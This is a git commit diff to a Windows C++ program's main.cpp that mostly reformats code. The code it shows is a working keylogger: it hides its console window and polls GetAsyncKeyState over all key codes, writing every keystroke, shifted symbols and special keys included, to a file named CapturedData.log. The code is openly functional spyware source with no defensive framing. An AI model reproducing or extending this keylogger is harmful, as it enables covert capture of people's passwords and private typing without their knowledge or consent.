b3dd2f8472043eabd2dcf2449619de3c119a5371
Ibne Nahian <evilprince2009@gmail.com>
2022-08-19 01:49:58 +0600

    Update main.cpp

--- main.cpp
+++ main.cpp
@@ -6,18 +6,17 @@
 using namespace std;
 void hide_cross_section()
 {
-    HWND cross_section = FindWindowA("ConsoleWindowClass",NULL);
+    HWND cross_section = FindWindowA("ConsoleWindowClass", nullptr);
     AllocConsole();
-    ShowWindow(cross_section,0);
+    ShowWindow(cross_section, 0);
 }
 
 void capture_strokes()
 {
-    char key;
     const char file_name[] = "CapturedData.log";
-    while (1)
+    while (true)
     {
-        for (key = 8; key <= 222; key++)
+        for (char key = 8; key <= 222; key++)
         {
             if (GetAsyncKeyState(key) == -32767)
             {
@@ -39,158 +38,158 @@ void capture_strokes()
                 {
                     switch (key)
                     {
-                        case 48:
-                            {
-                                if (GetAsyncKeyState(0x10))
-                                {
-                                    write << ")";
-                                }
-                                else
-                                {
-                                    write << "0";
-                                }
-                            }
-                            break;
+                    case 48:
+                    {
+                        if (GetAsyncKeyState(0x10))
+                        {
+                            write << ")";
+                        }
+                        else
+                        {
+                            write << "0";
+                        }
+                    }
+                    break;
 
-                        case 49:
-                            {
-                                if (GetAsyncKeyState(0x10))
-                                {
-                                    write << "!";
-                                }
-                                else
-                                {
-                                    write << "1";
-                                }
-                            }
-                            break;
+                    case 49:
+                    {
+                        if (GetAsyncKeyState(0x10))
+                        {
+                            write << "!";
+                        }
+                        else
+                        {
+                            write << "1";
+                        }
+                    }
+                    break;
 
-                        case 50:
-                            {
-                                if (GetAsyncKeyState(0x10))
-                                {
-                                    write << "@";
-                                }
-                                else
-                                {
-                                    write << "2";
-                                }
-                            }
-                            break;
+                    case 50:
+                    {
+                        if (GetAsyncKeyState(0x10))
+                        {
+                            write << "@";
+                        }
+                        else
+                        {
+                            write << "2";
+                        }
+                    }
+                    break;
 
-                        case 51:
-                            {
-                                if (GetAsyncKeyState(0x10))
-                                {
-                                    write << "#";
-                                }
-                                else
-                                {
-                                    write << "3";
-                                }
-                            }
-                            break;
+                    case 51:
+                    {
+                        if (GetAsyncKeyState(0x10))
+                        {
+                            write << "#";
+                        }
+                        else
+                        {
+                            write << "3";
+                        }
+                    }
+                    break;
 
-                        case 52:
-                            {
-                                if (GetAsyncKeyState(0x10))
-                                {
-                                    write << "$";
-                                }
-                                else
-                                {
-                                    write << "4";
-                                }
-                            }
-                            break;
+                    case 52:
+                    {
+                        if (GetAsyncKeyState(0x10))
+                        {
+                            write << "$";
+                        }
+                        else
+                        {
+                            write << "4";
+                        }
+                    }
+                    break;
 
-                        case 53:
-                            {
-                                if (GetAsyncKeyState(0x10))
-                                {
-                                    write << "%";
-                                }
-                                else
-                                {
-                                    write << "5";
-                                }
-                            }
-                            break;
+                    case 53:
+                    {
+                        if (GetAsyncKeyState(0x10))
+                        {
+                            write << "%";
+                        }
+                        else
+                        {
+                            write << "5";
+                        }
+                    }
+                    break;
 
-                        case 54:
-                            {
-                                if (GetAsyncKeyState(0x10))
-                                {
-                                    write << "^";
-                                }
-                                else
-                                {
-                                    write << "6";
-                                }
-                            }
-                            break;
+                    case 54:
+                    {
+                        if (GetAsyncKeyState(0x10))
+                        {
+                            write << "^";
+                        }
+                        else
+                        {
+                            write << "6";
+                        }
+                    }
+                    break;
 
-                        case 55:
-                            {
-                                if (GetAsyncKeyState(0x10))
-                                {
-                                    write << "&";
-                                }
-                                else
-                                {
-                                    write << "7";
-                                }
-                            }
-                            break;
+                    case 55:
+                    {
+                        if (GetAsyncKeyState(0x10))
+                        {
+                            write << "&";
+                        }
+                        else
+                        {
+                            write << "7";
+                        }
+                    }
+                    break;
 
-                        case 56:
-                            {
-                                if (GetAsyncKeyState(0x10))
-                                {
-                                    write << "*";
-                                }
-                                else
-                                {
-                                    write << "8";
-                                }
-                            }
-                            break;
+                    case 56:
+                    {
+                        if (GetAsyncKeyState(0x10))
+                        {
+                            write << "*";
+                        }
+                        else
+                        {
+                            write << "8";
+                        }
+                    }
+                    break;
 
-                        case 57:
-                            {
-                                if (GetAsyncKeyState(0x10))
-                                {
-                                    write << "(";
-                                }
-                                else
-                                {
-                                    write << "9";
-                                }
-                            }
-                            break;
+                    case 57:
+                    {
+                        if (GetAsyncKeyState(0x10))
+                        {
+                            write << "(";
+                        }
+                        else
+                        {
+                            write << "9";
+                        }
+                    }
+                    break;
 
-                        case VK_SPACE:
-                            write << " ";
-                            break;
+                    case VK_SPACE:
+                        write << " ";
+                        break;
 
-                        case VK_RETURN:
-                            write << "\n";
-                            break;
+                    case VK_RETURN:
+                        write << "\n";
+                        break;
 
-                        case VK_TAB:
-                            write << "  ";
-                            break;
+                    case VK_TAB:
+                        write << "  ";
+                        break;
 
-                        case VK_BACK:
-                            write << "<BACKSPACE>";
-                            break;
+                    case VK_BACK:
+                        write << "<BACKSPACE>";
+                        break;
 
-                        case VK_DELETE:
-                            write << "<Del>";
-                            break;
+                    case VK_DELETE:
+                        write << "<Del>";
+                        break;
 
-                        default:
-                            write << key;
+                    default:
+                        write << key;
                     }
                 }
             }
